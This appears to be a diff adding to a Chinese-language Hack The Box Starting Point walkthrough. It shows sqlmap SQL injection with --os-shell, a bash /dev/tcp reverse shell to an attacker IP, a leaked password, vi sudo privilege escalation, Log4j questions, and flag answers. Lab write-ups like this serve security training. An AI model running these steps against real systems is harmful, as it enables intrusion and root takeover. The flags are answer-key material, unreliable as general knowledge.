@@ -336,7 +336,42 @@ password:2cb42f8734ea607eefed3b70af13bbd3(md5)
 john解密md5得到：
 qwerty789   
 ```
-访问IP使用凭据登录，
+访问IP使用凭据登录:
+![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-08_19-53-49.png)
+发现搜索栏可能有注入。
+
+使用sqlmqp:
+```
+sqlmap -u "http://10.129.230.151/dashboard.php?search=0" --cookie="PHPSESSID=cqt9a9q4q84g1tgr8svgngl9ql" --os-shell
+```
+![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-08_20-23-05.png)
+在--os-shell的基础上，弹一个反向shell:
+```
+bash -c "bash -i >& /dev/tcp/10.10.16.41/443 0>&1"
+```
+![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-08_20-22-53.png)
+
+找到user.txt
+![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-08_20-29-17.png)
+
+
+在/var/www/htl/dashboard.php找到的密码
+![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-08_20-34-40.png)
+password:P@s5w0rd!
+
+有了密码就可以运行sudo -l:
+![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-09_18-38-33.png)
+
+vi提权的基本操作：
+```
+sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+ESC
+:set shell=/bin/sh ENTER
+:shell
+```
+
+![Alt text](../../../picture/HTB/start-point/Snipaste_2024-09-09_19-10-38.png)
+
 
 
 ### 除了 SSH 和 HTTP 之外，此盒子上还托管了哪些其他服务？
@@ -358,26 +393,23 @@ qwerty789
 答案：--os-shell
 
 ### postgres 用户可以使用 sudo 以 root 身份运行什么程序？
-答案：
+答案：vi
 
 ### 提交用户标志
-答案：
+答案：ec9b13ca4d6229cd5cc1e09980965bf7
 
 ### 提交root标志
-答案：
+答案：dd6e058e814260bc70e9bbdef2715849
 
 
 ## 第二层-unified
 
+这个房间有log4j的漏洞，需要有这个漏洞的前置知识
+
 nmap快速扫描：
 ```
-PORT     STATE SERVICE
-22/tcp   open  ssh
-6789/tcp open  ibm-db2-admin
-8080/tcp open  http-proxy
-8443/tcp open  https-alt
-8843/tcp open  unknown
-8880/tcp open  cddbp-alt
+
+
 ```
 
 
@@ -388,5 +420,40 @@ PORT     STATE SERVICE
 答案：22,6789,8080,8443
 
 ### 在端口 8443 上运行的软件的标题是什么？
+答案：UniFi Network
+
+### 正在运行的软件版本是什么？
+答案：6.4.54
+
+### 已识别漏洞的 CVE 是什么？
+答案：CVE-2021-44228
+
+### JNDI 在注入中使用什么协议？
+答案：LDAP
+
+### 我们使用什么工具来拦截流量，表明攻击成功？
+答案：tcpdump
+
+### 我们需要检查拦截的流量的哪个端口？
 答案：
 
+### MongoDB 服务在哪个端口上运行？
+答案：
+
+### UniFi 应用程序的默认数据库名称是什么？
+答案：
+
+### 我们在 MongoDB 中用来枚举数据库中的用户的函数是什么？
+答案：
+
+### 我们在 MongoDB 中更新数据库内用户的函数是什么？
+答案：
+
+### root 用户的密码是什么？
+答案：
+
+### 提交用户标志
+答案：
+
+### 提交根标志
+答案：
